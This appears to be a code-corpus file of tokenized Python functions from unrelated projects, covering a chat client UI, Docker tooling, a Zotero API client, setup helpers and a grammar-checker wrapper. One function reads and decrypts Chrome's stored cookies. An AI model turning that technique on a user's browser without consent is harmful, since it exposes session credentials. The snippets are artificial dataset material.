def show_message ( self , message_str ) : if self . _message_handle is not None : self . _message_handle . cancel ( ) self . _message_handle = asyncio . get_event_loop ( ) . call_later ( self . _MESSAGE_DELAY_SECS , self . _clear_message ) self . _message = message_str self . _update ( )
def _on_event ( self , conv_event ) : if isinstance ( conv_event , hangups . ChatMessageEvent ) : self . _typing_statuses [ conv_event . user_id ] = ( hangups . TYPING_TYPE_STOPPED ) self . _update ( )
def _on_typing ( self , typing_message ) : self . _typing_statuses [ typing_message . user_id ] = typing_message . status self . _update ( )
def _update ( self ) : typing_users = [ self . _conversation . get_user ( user_id ) for user_id , status in self . _typing_statuses . items ( ) if status == hangups . TYPING_TYPE_STARTED ] displayed_names = [ user . first_name for user in typing_users if not user . is_self ] if displayed_names : typing_message = '{} {} typing...' . format ( ', ' . join ( sorted ( displayed_names ) ) , 'is' if len ( displayed_names ) == 1 else 'are' ) else : typing_message = '' if not self . _is_connected : self . _widget . set_text ( "RECONNECTING..." ) elif self . _message is not None : self . _widget . set_text ( self . _message ) else : self . _widget . set_text ( typing_message )
def _get_date_str ( timestamp , datetimefmt , show_date = False ) : fmt = '' if show_date : fmt += '\n' + datetimefmt . get ( 'date' , '' ) + '\n' fmt += datetimefmt . get ( 'time' , '' ) return timestamp . astimezone ( tz = None ) . strftime ( fmt )
async def _load ( self ) : try : conv_events = await self . _conversation . get_events ( self . _conversation . events [ 0 ] . id_ ) except ( IndexError , hangups . NetworkError ) : conv_events = [ ] if not conv_events : self . _first_loaded = True if self . _focus_position == self . POSITION_LOADING and conv_events : # If the loading indicator is still focused, and we loaded more # events, set focus on the first new event so the loaded # indicator is replaced. self . set_focus ( conv_events [ - 1 ] . id_ ) else : # Otherwise, still need to invalidate in case the loading # indicator is showing but not focused. self . _modified ( ) # Loading events can also update the watermarks. self . _refresh_watermarked_events ( ) self . _is_loading = False
def set_focus ( self , position ) : self . _focus_position = position self . _modified ( ) # If we set focus to anywhere but the last position, the user if # scrolling up: try : self . next_position ( position ) except IndexError : self . _is_scrolling = False else : self . _is_scrolling = True
def get_menu_widget ( self , close_callback ) : return ConversationMenu ( self . _coroutine_queue , self . _conversation , close_callback , self . _keys )
def keypress ( self , size , key ) : # Set the client as active. self . _coroutine_queue . put ( self . _client . set_active ( ) ) # Mark the newest event as read. self . _coroutine_queue . put ( self . _conversation . update_read_timestamp ( ) ) return super ( ) . keypress ( size , key )
def _set_title ( self ) : self . title = get_conv_name ( self . _conversation , show_unread = True , truncate = True ) self . _set_title_cb ( self , self . title )
def _on_return ( self , text ) : # Ignore if the user hasn't typed a message. if not text : return elif text . startswith ( '/image' ) and len ( text . split ( ' ' ) ) == 2 : # Temporary UI for testing image uploads filename = text . split ( ' ' ) [ 1 ] image_file = open ( filename , 'rb' ) text = '' else : image_file = None text = replace_emoticons ( text ) segments = hangups . ChatMessageSegment . from_str ( text ) self . _coroutine_queue . put ( self . _handle_send_message ( self . _conversation . send_message ( segments , image_file = image_file ) ) )
def _update_tabs ( self ) : text = [ ] for num , widget in enumerate ( self . _widgets ) : palette = ( 'active_tab' if num == self . _tab_index else 'inactive_tab' ) text += [ ( palette , ' {} ' . format ( self . _widget_title [ widget ] ) ) , ( 'tab_background' , ' ' ) , ] self . _tabs . set_text ( text ) self . _frame . contents [ 'body' ] = ( self . _widgets [ self . _tab_index ] , None )
def keypress ( self , size , key ) : key = super ( ) . keypress ( size , key ) num_tabs = len ( self . _widgets ) if key == self . _keys [ 'prev_tab' ] : self . _tab_index = ( self . _tab_index - 1 ) % num_tabs self . _update_tabs ( ) elif key == self . _keys [ 'next_tab' ] : self . _tab_index = ( self . _tab_index + 1 ) % num_tabs self . _update_tabs ( ) elif key == self . _keys [ 'close_tab' ] : # Don't allow closing the Conversations tab if self . _tab_index > 0 : curr_tab = self . _widgets [ self . _tab_index ] self . _widgets . remove ( curr_tab ) del self . _widget_title [ curr_tab ] self . _tab_index -= 1 self . _update_tabs ( ) else : return key
async def _on_push_data ( self , data_bytes ) : logger . debug ( 'Received chunk:\n{}' . format ( data_bytes ) ) for chunk in self . _chunk_parser . get_chunks ( data_bytes ) : # Consider the channel connected once the first chunk is received. if not self . _is_connected : if self . _on_connect_called : self . _is_connected = True await self . on_reconnect . fire ( ) else : self . _on_connect_called = True self . _is_connected = True await self . on_connect . fire ( ) # chunk contains a container array container_array = json . loads ( chunk ) # container array is an array of inner arrays for inner_array in container_array : # inner_array always contains 2 elements, the array_id and the # data_array. array_id , data_array = inner_array logger . debug ( 'Chunk contains data array with id %r:\n%r' , array_id , data_array ) await self . on_receive_array . fire ( data_array )
def _decode_field ( message , field , value ) : if field . type == FieldDescriptor . TYPE_MESSAGE : decode ( getattr ( message , field . name ) , value ) else : try : if field . type == FieldDescriptor . TYPE_BYTES : value = base64 . b64decode ( value ) setattr ( message , field . name , value ) except ( ValueError , TypeError ) as e : # ValueError: invalid enum value, negative unsigned int value, or # invalid base64 # TypeError: mismatched type logger . warning ( 'Message %r ignoring field %s: %s' , message . __class__ . __name__ , field . name , e )
def _decode_repeated_field ( message , field , value_list ) : if field . type == FieldDescriptor . TYPE_MESSAGE : for value in value_list : decode ( getattr ( message , field . name ) . add ( ) , value ) else : try : for value in value_list : if field . type == FieldDescriptor . TYPE_BYTES : value = base64 . b64decode ( value ) getattr ( message , field . name ) . append ( value ) except ( ValueError , TypeError ) as e : # ValueError: invalid enum value, negative unsigned int value, or # invalid base64 # TypeError: mismatched type logger . warning ( 'Message %r ignoring repeated field %s: %s' , message . __class__ . __name__ , field . name , e ) # Ignore any values already decoded by clearing list message . ClearField ( field . name )
def remove_exited_dusty_containers ( ) : client = get_docker_client ( ) exited_containers = get_exited_dusty_containers ( ) removed_containers = [ ] for container in exited_containers : log_to_client ( "Removing container {}" . format ( container [ 'Names' ] [ 0 ] ) ) try : client . remove_container ( container [ 'Id' ] , v = True ) removed_containers . append ( container ) except Exception as e : log_to_client ( e . message or str ( e ) ) return removed_containers
def remove_images ( ) : client = get_docker_client ( ) removed = _remove_dangling_images ( ) dusty_images = get_dusty_images ( ) all_images = client . images ( all = True ) for image in all_images : if set ( image [ 'RepoTags' ] ) . intersection ( dusty_images ) : try : client . remove_image ( image [ 'Id' ] ) except Exception as e : logging . info ( "Couldn't remove image {}" . format ( image [ 'RepoTags' ] ) ) else : log_to_client ( "Removed Image {}" . format ( image [ 'RepoTags' ] ) ) removed . append ( image ) return removed
def case_insensitive_rename ( src , dst ) : temp_dir = tempfile . mkdtemp ( ) shutil . rmtree ( temp_dir ) shutil . move ( src , temp_dir ) shutil . move ( temp_dir , dst )
def _composed_app_dict ( app_name , assembled_specs , port_specs ) : logging . info ( "Compose Compiler: Compiling dict for app {}" . format ( app_name ) ) app_spec = assembled_specs [ 'apps' ] [ app_name ] compose_dict = app_spec [ "compose" ] _apply_env_overrides ( env_overrides_for_app_or_service ( app_name ) , compose_dict ) if 'image' in app_spec and 'build' in app_spec : raise RuntimeError ( "image and build are both specified in the spec for {}" . format ( app_name ) ) elif 'image' in app_spec : logging . info compose_dict [ 'image' ] = app_spec [ 'image' ] elif 'build' in app_spec : compose_dict [ 'build' ] = _get_build_path ( app_spec ) else : raise RuntimeError ( "Neither image nor build was specified in the spec for {}" . format ( app_name ) ) compose_dict [ 'entrypoint' ] = [ ] compose_dict [ 'command' ] = _compile_docker_command ( app_spec ) compose_dict [ 'container_name' ] = "dusty_{}_1" . format ( app_name ) logging . info ( "Compose Compiler: compiled command {}" . format ( compose_dict [ 'command' ] ) ) compose_dict [ 'links' ] = _links_for_app ( app_spec , assembled_specs ) logging . info ( "Compose Compiler: links {}" . format ( compose_dict [ 'links' ] ) ) compose_dict [ 'volumes' ] = compose_dict [ 'volumes' ] + _get_compose_volumes ( app_name , assembled_specs ) logging . info ( "Compose Compiler: volumes {}" . format ( compose_dict [ 'volumes' ] ) ) port_list = _get_ports_list ( app_name , port_specs ) if port_list : compose_dict [ 'ports' ] = port_list logging . info ( "Compose Compiler: ports {}" . format ( port_list ) ) compose_dict [ 'user' ] = 'root' return compose_dict
def _get_ports_list ( app_name , port_specs ) : if app_name not in port_specs [ 'docker_compose' ] : return [ ] return [ "{}:{}" . format ( port_spec [ 'mapped_host_port' ] , port_spec [ 'in_container_port' ] ) for port_spec in port_specs [ 'docker_compose' ] [ app_name ] ]
def _expand_libs_in_apps ( specs ) : for app_name , app_spec in specs [ 'apps' ] . iteritems ( ) : if 'depends' in app_spec and 'libs' in app_spec [ 'depends' ] : app_spec [ 'depends' ] [ 'libs' ] = _get_dependent ( 'libs' , app_name , specs , 'apps' )
def _expand_libs_in_libs ( specs ) : for lib_name , lib_spec in specs [ 'libs' ] . iteritems ( ) : if 'depends' in lib_spec and 'libs' in lib_spec [ 'depends' ] : lib_spec [ 'depends' ] [ 'libs' ] = _get_dependent ( 'libs' , lib_name , specs , 'libs' )
def _get_referenced_libs ( specs ) : active_libs = set ( ) for app_spec in specs [ 'apps' ] . values ( ) : for lib in app_spec [ 'depends' ] [ 'libs' ] : active_libs . add ( lib ) return active_libs
def _nginx_location_spec ( port_spec , bridge_ip ) : location_string_spec = "\t \t location / { \n" for location_setting in [ 'proxy_http_version 1.1;' , 'proxy_set_header Upgrade $http_upgrade;' , 'proxy_set_header Connection "upgrade";' , 'proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;' , 'proxy_set_header Host $http_host;' , _nginx_proxy_string ( port_spec , bridge_ip ) ] : location_string_spec += "\t \t \t {} \n" . format ( location_setting ) location_string_spec += "\t \t } \n" return location_string_spec
def _nginx_http_spec ( port_spec , bridge_ip ) : server_string_spec = "\t server {\n" server_string_spec += "\t \t {}\n" . format ( _nginx_max_file_size_string ( ) ) server_string_spec += "\t \t {}\n" . format ( _nginx_listen_string ( port_spec ) ) server_string_spec += "\t \t {}\n" . format ( _nginx_server_name_string ( port_spec ) ) server_string_spec += _nginx_location_spec ( port_spec , bridge_ip ) server_string_spec += _custom_502_page ( ) server_string_spec += "\t }\n" return server_string_spec
def _nginx_stream_spec ( port_spec , bridge_ip ) : server_string_spec = "\t server {\n" server_string_spec += "\t \t {}\n" . format ( _nginx_listen_string ( port_spec ) ) server_string_spec += "\t \t {}\n" . format ( _nginx_proxy_string ( port_spec , bridge_ip ) ) server_string_spec += "\t }\n" return server_string_spec
def get_lib_volume_mounts ( base_lib_name , assembled_specs ) : volumes = [ _get_lib_repo_volume_mount ( assembled_specs [ 'libs' ] [ base_lib_name ] ) ] volumes . append ( get_command_files_volume_mount ( base_lib_name , test = True ) ) for lib_name in assembled_specs [ 'libs' ] [ base_lib_name ] [ 'depends' ] [ 'libs' ] : lib_spec = assembled_specs [ 'libs' ] [ lib_name ] volumes . append ( _get_lib_repo_volume_mount ( lib_spec ) ) return volumes
def _get_app_libs_volume_mounts ( app_name , assembled_specs ) : volumes = [ ] for lib_name in assembled_specs [ 'apps' ] [ app_name ] [ 'depends' ] [ 'libs' ] : lib_spec = assembled_specs [ 'libs' ] [ lib_name ] volumes . append ( "{}:{}" . format ( Repo ( lib_spec [ 'repo' ] ) . vm_path , container_code_path ( lib_spec ) ) ) return volumes
def _init_docker_vm ( ) : if not _dusty_vm_exists ( ) : log_to_client ( 'Initializing new Dusty VM with Docker Machine' ) machine_options = [ '--driver' , 'virtualbox' , '--virtualbox-cpu-count' , '-1' , '--virtualbox-boot2docker-url' , constants . CONFIG_BOOT2DOCKER_URL , '--virtualbox-memory' , str ( get_config_value ( constants . CONFIG_VM_MEM_SIZE ) ) , '--virtualbox-hostonly-nictype' , constants . VM_NIC_TYPE ] check_call_demoted ( [ 'docker-machine' , 'create' ] + machine_options + [ constants . VM_MACHINE_NAME ] , redirect_stderr = True )
def _start_docker_vm ( ) : is_running = docker_vm_is_running ( ) if not is_running : log_to_client ( 'Starting docker-machine VM {}' . format ( constants . VM_MACHINE_NAME ) ) _apply_nat_dns_host_resolver ( ) _apply_nat_net_less_greedy_subnet ( ) check_and_log_output_and_error_demoted ( [ 'docker-machine' , 'start' , constants . VM_MACHINE_NAME ] , quiet_on_success = True ) return is_running
def docker_vm_is_running ( ) : running_vms = check_output_demoted ( [ 'VBoxManage' , 'list' , 'runningvms' ] ) for line in running_vms . splitlines ( ) : if '"{}"' . format ( constants . VM_MACHINE_NAME ) in line : return True return False
def create_cookie ( host , path , secure , expires , name , value ) : return http . cookiejar . Cookie ( 0 , name , value , None , False , host , host . startswith ( '.' ) , host . startswith ( '.' ) , path , True , secure , expires , False , None , None , { } )
def load ( self ) : con = sqlite3 . connect ( self . tmp_cookie_file ) cur = con . cursor ( ) try : # chrome <=55 cur . execute ( 'SELECT host_key, path, secure, expires_utc, name, value, encrypted_value ' 'FROM cookies WHERE host_key like "%{}%";' . format ( self . domain_name ) ) except sqlite3 . OperationalError : # chrome >=56 cur . execute ( 'SELECT host_key, path, is_secure, expires_utc, name, value, encrypted_value ' 'FROM cookies WHERE host_key like "%{}%";' . format ( self . domain_name ) ) cj = http . cookiejar . CookieJar ( ) for item in cur . fetchall ( ) : host , path , secure , expires , name = item [ : 5 ] value = self . _decrypt ( item [ 5 ] , item [ 6 ] ) c = create_cookie ( host , path , secure , expires , name , value ) cj . set_cookie ( c ) con . close ( ) return cj
def ib64_patched ( self , attrsD , contentparams ) : if attrsD . get ( "mode" , "" ) == "base64" : return 0 if self . contentparams [ "type" ] . startswith ( "text/" ) : return 0 if self . contentparams [ "type" ] . endswith ( "+xml" ) : return 0 if self . contentparams [ "type" ] . endswith ( "/xml" ) : return 0 if self . contentparams [ "type" ] . endswith ( "/json" ) : return 0 return 0
def cleanwrap ( func ) : def enc ( self , * args , * * kwargs ) : """ Send each item to _cleanup() """ return ( func ( self , item , * * kwargs ) for item in args ) return enc
def ss_wrap ( func ) : def wrapper ( self , * args , * * kwargs ) : if not self . savedsearch : self . savedsearch = SavedSearch ( self ) return func ( self , * args , * * kwargs ) return wrapper
def error_handler ( req ) : error_codes = { 400 : ze . UnsupportedParams , 401 : ze . UserNotAuthorised , 403 : ze . UserNotAuthorised , 404 : ze . ResourceNotFound , 409 : ze . Conflict , 412 : ze . PreConditionFailed , 413 : ze . RequestEntityTooLarge , 428 : ze . PreConditionRequired , 429 : ze . TooManyRequests , } def err_msg ( req ) : return "\nCode: %s\nURL: %s\nMethod: %s\nResponse: %s" % ( req . status_code , # error.msg, req . url , req . request . method , req . text , ) if error_codes . get ( req . status_code ) : # check to see whether its 429 if req . status_code == 429 : # call our back-off function delay = backoff . delay if delay > 32 : # we've waited a total of 62 seconds (2 + 4  + 32), so give up backoff . reset ( ) raise ze . TooManyRetries ( ) time . sleep ( delay ) sess = requests . Session ( ) new_req = sess . send ( req . request ) try : new_req . raise_for_status ( ) except requests . exceptions . HTTPError : error_handler ( new_req ) else : raise error_codes . get ( req . status_code ) ( err_msg ( req ) ) else : raise ze . HTTPError ( err_msg ( req ) )
def default_headers ( self ) : _headers = { "User-Agent" : "Pyzotero/%s" % __version__ , "Zotero-API-Version" : "%s" % __api_version__ , } if self . api_key : _headers [ "Authorization" ] = "Bearer %s" % self . api_key return _headers
def _cleanup ( self , to_clean , allow = ( ) ) : # this item's been retrieved from the API, we only need the 'data' # entry if to_clean . keys ( ) == [ "links" , "library" , "version" , "meta" , "key" , "data" ] : to_clean = to_clean [ "data" ] return dict ( [ [ k , v ] for k , v in list ( to_clean . items ( ) ) if ( k in allow or k not in self . temp_keys ) ] )
def _extract_links ( self ) : extracted = dict ( ) try : for key , value in self . request . links . items ( ) : parsed = urlparse ( value [ "url" ] ) fragment = "{path}?{query}" . format ( path = parsed [ 2 ] , query = parsed [ 4 ] ) extracted [ key ] = fragment # add a 'self' link parsed = list ( urlparse ( self . self_link ) ) # strip 'format' query parameter stripped = "&" . join ( [ "%s=%s" % ( p [ 0 ] , p [ 1 ] ) for p in parse_qsl ( parsed [ 4 ] ) if p [ 0 ] != "format" ] ) # rebuild url fragment # this is a death march extracted [ "self" ] = urlunparse ( [ parsed [ 0 ] , parsed [ 1 ] , parsed [ 2 ] , parsed [ 3 ] , stripped , parsed [ 5 ] ] ) return extracted except KeyError : # No links present, because it's a single item return None
def publications ( self ) : if self . library_type != "users" : raise ze . CallDoesNotExist ( "This API call does not exist for group libraries" ) query_string = "/{t}/{u}/publications/items" return self . _build_query ( query_string )
def num_collectionitems ( self , collection ) : query = "/{t}/{u}/collections/{c}/items" . format ( u = self . library_id , t = self . library_type , c = collection . upper ( ) ) return self . _totals ( query )
def num_tagitems ( self , tag ) : query = "/{t}/{u}/tags/{ta}/items" . format ( u = self . library_id , t = self . library_type , ta = tag ) return self . _totals ( query )
def _totals ( self , query ) : self . add_parameters ( limit = 1 ) query = self . _build_query ( query ) self . _retrieve_data ( query ) self . url_params = None # extract the 'total items' figure return int ( self . request . headers [ "Total-Results" ] )
def fulltext_item ( self , itemkey , * * kwargs ) : query_string = "/{t}/{u}/items/{itemkey}/fulltext" . format ( t = self . library_type , u = self . library_id , itemkey = itemkey ) return self . _build_query ( query_string )
def last_modified_version ( self , * * kwargs ) : self . items ( * * kwargs ) return int ( self . request . headers . get ( "last-modified-version" , 0 ) )
def file ( self , item , * * kwargs ) : query_string = "/{t}/{u}/items/{i}/file" . format ( u = self . library_id , t = self . library_type , i = item . upper ( ) ) return self . _build_query ( query_string , no_params = True )
def dump ( self , itemkey , filename = None , path = None ) : if not filename : filename = self . item ( itemkey ) [ "data" ] [ "filename" ] if path : pth = os . path . join ( path , filename ) else : pth = filename file = self . file ( itemkey ) if self . snapshot : self . snapshot = False pth = pth + ".zip" with open ( pth , "wb" ) as f : f . write ( file )
def collections_sub ( self , collection , * * kwargs ) : query_string = "/{t}/{u}/collections/{c}/collections" . format ( u = self . library_id , t = self . library_type , c = collection . upper ( ) ) return self . _build_query ( query_string )
def _json_processor ( self , retrieved ) : json_kwargs = { } if self . preserve_json_order : json_kwargs [ "object_pairs_hook" ] = OrderedDict # send entries to _tags_data if there's no JSON try : items = [ json . loads ( e [ "content" ] [ 0 ] [ "value" ] , * * json_kwargs ) for e in retrieved . entries ] except KeyError : return self . _tags_data ( retrieved ) return items
def _csljson_processor ( self , retrieved ) : items = [ ] json_kwargs = { } if self . preserve_json_order : json_kwargs [ "object_pairs_hook" ] = OrderedDict for csl in retrieved . entries : items . append ( json . loads ( csl [ "content" ] [ 0 ] [ "value" ] , * * json_kwargs ) ) self . url_params = None return items
def _bib_processor ( self , retrieved ) : items = [ ] for bib in retrieved . entries : items . append ( bib [ "content" ] [ 0 ] [ "value" ] ) self . url_params = None return items
def _citation_processor ( self , retrieved ) : items = [ ] for cit in retrieved . entries : items . append ( cit [ "content" ] [ 0 ] [ "value" ] ) self . url_params = None return items
def item_template ( self , itemtype ) : # if we have a template and it hasn't been updated since we stored it template_name = "item_template_" + itemtype query_string = "/items/new?itemType={i}" . format ( i = itemtype ) if self . templates . get ( template_name ) and not self . _updated ( query_string , self . templates [ template_name ] , template_name ) : return copy . deepcopy ( self . templates [ template_name ] [ "tmplt" ] ) # otherwise perform a normal request and cache the response retrieved = self . _retrieve_data ( query_string ) return self . _cache ( retrieved , template_name )
def show_condition_operators ( self , condition ) : # dict keys of allowed operators for the current condition permitted_operators = self . savedsearch . conditions_operators . get ( condition ) # transform these into values permitted_operators_list = set ( [ self . savedsearch . operators . get ( op ) for op in permitted_operators ] ) return permitted_operators_list
def fields_types ( self , tname , qstring , itemtype ) : # check for a valid cached version template_name = tname + itemtype query_string = qstring . format ( i = itemtype ) if self . templates . get ( template_name ) and not self . _updated ( query_string , self . templates [ template_name ] , template_name ) : return self . templates [ template_name ] [ "tmplt" ] # otherwise perform a normal request and cache the response retrieved = self . _retrieve_data ( query_string ) return self . _cache ( retrieved , template_name )
def item_fields ( self ) : # Check for a valid cached version if self . templates . get ( "item_fields" ) and not self . _updated ( "/itemFields" , self . templates [ "item_fields" ] , "item_fields" ) : return self . templates [ "item_fields" ] [ "tmplt" ] query_string = "/itemFields" # otherwise perform a normal request and cache the response retrieved = self . _retrieve_data ( query_string ) return self . _cache ( retrieved , "item_fields" )
def _validate ( self , conditions ) : allowed_keys = set ( self . searchkeys ) operators_set = set ( self . operators . keys ( ) ) for condition in conditions : if set ( condition . keys ( ) ) != allowed_keys : raise ze . ParamNotPassed ( "Keys must be all of: %s" % ", " . join ( self . searchkeys ) ) if condition . get ( "operator" ) not in operators_set : raise ze . ParamNotPassed ( "You have specified an unknown operator: %s" % condition . get ( "operator" ) ) # dict keys of allowed operators for the current condition permitted_operators = self . conditions_operators . get ( condition . get ( "condition" ) ) # transform these into values permitted_operators_list = set ( [ self . operators . get ( op ) for op in permitted_operators ] ) if condition . get ( "operator" ) not in permitted_operators_list : raise ze . ParamNotPassed ( "You may not use the '%s' operator when selecting the '%s' condition. \nAllowed operators: %s" % ( condition . get ( "operator" ) , condition . get ( "condition" ) , ", " . join ( list ( permitted_operators_list ) ) , ) )
def which ( program , win_allow_cross_arch = True ) : def is_exe ( path ) : return os . path . isfile ( path ) and os . access ( path , os . X_OK ) def _get_path_list ( ) : return os . environ [ 'PATH' ] . split ( os . pathsep ) if os . name == 'nt' : def find_exe ( program ) : root , ext = os . path . splitext ( program ) if ext : if is_exe ( program ) : return program else : for ext in os . environ [ 'PATHEXT' ] . split ( os . pathsep ) : program_path = root + ext . lower ( ) if is_exe ( program_path ) : return program_path return None def get_path_list ( ) : paths = _get_path_list ( ) if win_allow_cross_arch : alt_sys_path = os . path . expandvars ( r"$WINDIR\Sysnative" ) if os . path . isdir ( alt_sys_path ) : paths . insert ( 0 , alt_sys_path ) else : alt_sys_path = os . path . expandvars ( r"$WINDIR\SysWOW64" ) if os . path . isdir ( alt_sys_path ) : paths . append ( alt_sys_path ) return paths else : def find_exe ( program ) : return program if is_exe ( program ) else None get_path_list = _get_path_list if os . path . split ( program ) [ 0 ] : program_path = find_exe ( program ) if program_path : return program_path else : for path in get_path_list ( ) : program_path = find_exe ( os . path . join ( path , program ) ) if program_path : return program_path return None
def split_multiline ( value ) : return [ element for element in ( line . strip ( ) for line in value . split ( '\n' ) ) if element ]
def split_elements ( value ) : items = [ v . strip ( ) for v in value . split ( ',' ) ] if len ( items ) == 1 : items = value . split ( ) return items
def eval_environ ( value ) : def eval_environ_str ( value ) : parts = value . split ( ';' ) if len ( parts ) < 2 : return value expr = parts [ 1 ] . lstrip ( ) if not re . match ( "^((\\w+(\\.\\w+)?|'.*?'|\".*?\")\\s+" '(in|==|!=|not in)\\s+' "(\\w+(\\.\\w+)?|'.*?'|\".*?\")" '(\\s+(or|and)\\s+)?)+$' , expr ) : raise ValueError ( 'bad environment marker: %r' % expr ) expr = re . sub ( r"(platform\.\w+)" , r"\1()" , expr ) return parts [ 0 ] if eval ( expr ) else '' if isinstance ( value , list ) : new_value = [ ] for element in value : element = eval_environ_str ( element ) if element : new_value . append ( element ) elif isinstance ( value , str ) : new_value = eval_environ_str ( value ) else : new_value = value return new_value
def get_cfg_value ( config , section , option ) : try : value = config [ section ] [ option ] except KeyError : if ( section , option ) in MULTI_OPTIONS : return [ ] else : return '' if ( section , option ) in MULTI_OPTIONS : value = split_multiline ( value ) if ( section , option ) in ENVIRON_OPTIONS : value = eval_environ ( value ) return value
def set_cfg_value ( config , section , option , value ) : if isinstance ( value , list ) : value = '\n' . join ( value ) config [ section ] [ option ] = value
def cfg_to_args ( config ) : kwargs = { } opts_to_args = { 'metadata' : [ ( 'name' , 'name' ) , ( 'author' , 'author' ) , ( 'author-email' , 'author_email' ) , ( 'maintainer' , 'maintainer' ) , ( 'maintainer-email' , 'maintainer_email' ) , ( 'home-page' , 'url' ) , ( 'summary' , 'description' ) , ( 'description' , 'long_description' ) , ( 'download-url' , 'download_url' ) , ( 'classifier' , 'classifiers' ) , ( 'platform' , 'platforms' ) , ( 'license' , 'license' ) , ( 'keywords' , 'keywords' ) , ] , 'files' : [ ( 'packages_root' , 'package_dir' ) , ( 'packages' , 'packages' ) , ( 'modules' , 'py_modules' ) , ( 'scripts' , 'scripts' ) , ( 'package_data' , 'package_data' ) , ( 'data_files' , 'data_files' ) , ] , } opts_to_args [ 'metadata' ] . append ( ( 'requires-dist' , 'install_requires' ) ) if IS_PY2K and not which ( '3to2' ) : kwargs [ 'setup_requires' ] = [ '3to2' ] kwargs [ 'zip_safe' ] = False for section in opts_to_args : for option , argname in opts_to_args [ section ] : value = get_cfg_value ( config , section , option ) if value : kwargs [ argname ] = value if 'long_description' not in kwargs : kwargs [ 'long_description' ] = read_description_file ( config ) if 'package_dir' in kwargs : kwargs [ 'package_dir' ] = { '' : kwargs [ 'package_dir' ] } if 'keywords' in kwargs : kwargs [ 'keywords' ] = split_elements ( kwargs [ 'keywords' ] ) if 'package_data' in kwargs : kwargs [ 'package_data' ] = get_package_data ( kwargs [ 'package_data' ] ) if 'data_files' in kwargs : kwargs [ 'data_files' ] = get_data_files ( kwargs [ 'data_files' ] ) kwargs [ 'version' ] = get_version ( ) if not IS_PY2K : kwargs [ 'test_suite' ] = 'test' return kwargs
def run_3to2 ( args = None ) : args = BASE_ARGS_3TO2 if args is None else BASE_ARGS_3TO2 + args try : proc = subprocess . Popen ( [ '3to2' ] + args , stderr = subprocess . PIPE ) except OSError : for path in glob . glob ( '*.egg' ) : if os . path . isdir ( path ) and path not in sys . path : sys . path . append ( path ) try : from lib3to2 . main import main as lib3to2_main except ImportError : raise OSError ( '3to2 script is unavailable.' ) else : if lib3to2_main ( 'lib3to2.fixes' , args ) : raise Exception ( 'lib3to2 parsing error' ) else : # HACK: workaround for 3to2 never returning non-zero # when using the -j option. num_errors = 0 while proc . poll ( ) is None : line = proc . stderr . readline ( ) sys . stderr . write ( line ) num_errors += line . count ( ': ParseError: ' ) if proc . returncode or num_errors : raise Exception ( 'lib3to2 parsing error' )
def write_py2k_header ( file_list ) : if not isinstance ( file_list , list ) : file_list = [ file_list ] python_re = re . compile ( br"^(#!.*\bpython)(.*)([\r\n]+)$" ) coding_re = re . compile ( br"coding[:=]\s*([-\w.]+)" ) new_line_re = re . compile ( br"([\r\n]+)$" ) version_3 = LooseVersion ( '3' ) for file in file_list : if not os . path . getsize ( file ) : continue rewrite_needed = False python_found = False coding_found = False lines = [ ] f = open ( file , 'rb' ) try : while len ( lines ) < 2 : line = f . readline ( ) match = python_re . match ( line ) if match : python_found = True version = LooseVersion ( match . group ( 2 ) . decode ( ) or '2' ) try : version_test = version >= version_3 except TypeError : version_test = True if version_test : line = python_re . sub ( br"\g<1>2\g<3>" , line ) rewrite_needed = True elif coding_re . search ( line ) : coding_found = True lines . append ( line ) if not coding_found : match = new_line_re . search ( lines [ 0 ] ) newline = match . group ( 1 ) if match else b"\n" line = b"# -*- coding: utf-8 -*-" + newline lines . insert ( 1 if python_found else 0 , line ) rewrite_needed = True if rewrite_needed : lines += f . readlines ( ) finally : f . close ( ) if rewrite_needed : f = open ( file , 'wb' ) try : f . writelines ( lines ) finally : f . close ( )
def which ( program ) : if os . path . split ( program ) [ 0 ] : program_path = find_exe ( program ) if program_path : return program_path else : for path in get_path_list ( ) : program_path = find_exe ( os . path . join ( path , program ) ) if program_path : return program_path return None
def correct ( text : str , matches : [ Match ] ) -> str : ltext = list ( text ) matches = [ match for match in matches if match . replacements ] errors = [ ltext [ match . offset : match . offset + match . errorlength ] for match in matches ] correct_offset = 0 for n , match in enumerate ( matches ) : frompos , topos = ( correct_offset + match . offset , correct_offset + match . offset + match . errorlength ) if ltext [ frompos : topos ] != errors [ n ] : continue repl = match . replacements [ 0 ] ltext [ frompos : topos ] = list ( repl ) correct_offset += len ( repl ) - len ( errors [ n ] ) return '' . join ( ltext )
def get_version ( ) : version = _get_attrib ( ) . get ( 'version' ) if not version : match = re . search ( r"LanguageTool-?.*?(\S+)$" , get_directory ( ) ) if match : version = match . group ( 1 ) return version
def get_languages ( ) -> set : try : languages = cache [ 'languages' ] except KeyError : languages = LanguageTool . _get_languages ( ) cache [ 'languages' ] = languages return languages
def get_directory ( ) : try : language_check_dir = cache [ 'language_check_dir' ] except KeyError : def version_key ( string ) : return [ int ( e ) if e . isdigit ( ) else e for e in re . split ( r"(\d+)" , string ) ] def get_lt_dir ( base_dir ) : paths = [ path for path in glob . glob ( os . path . join ( base_dir , 'LanguageTool*' ) ) if os . path . isdir ( path ) ] return max ( paths , key = version_key ) if paths else None base_dir = os . path . dirname ( sys . argv [ 0 ] ) language_check_dir = get_lt_dir ( base_dir ) if not language_check_dir : try : base_dir = os . path . dirname ( os . path . abspath ( __file__ ) ) except NameError : pass else : language_check_dir = get_lt_dir ( base_dir ) if not language_check_dir : raise PathError ( "can't find LanguageTool directory in {!r}" . format ( base_dir ) ) cache [ 'language_check_dir' ] = language_check_dir return language_check_dir
def set_directory ( path = None ) : old_path = get_directory ( ) terminate_server ( ) cache . clear ( ) if path : cache [ 'language_check_dir' ] = path try : get_jar_info ( ) except Error : cache [ 'language_check_dir' ] = old_path raise
def check ( self , text : str , srctext = None ) -> [ Match ] : root = self . _get_root ( self . _url , self . _encode ( text , srctext ) ) return [ Match ( e . attrib ) for e in root if e . tag == 'error' ]
def correct ( self , text : str , srctext = None ) -> str : return correct ( text , self . check ( text , srctext ) )
def get_common_prefix ( z ) : name_list = z . namelist ( ) if name_list and all ( n . startswith ( name_list [ 0 ] ) for n in name_list [ 1 : ] ) : return name_list [ 0 ] return None
def _process_events ( self , events ) : for f , callback , transferred , key , ov in events : try : self . _logger . debug ( 'Invoking event callback {}' . format ( callback ) ) value = callback ( transferred , key , ov ) except OSError : self . _logger . warning ( 'Event callback failed' , exc_info = sys . exc_info ( ) ) else : f . set_result ( value )
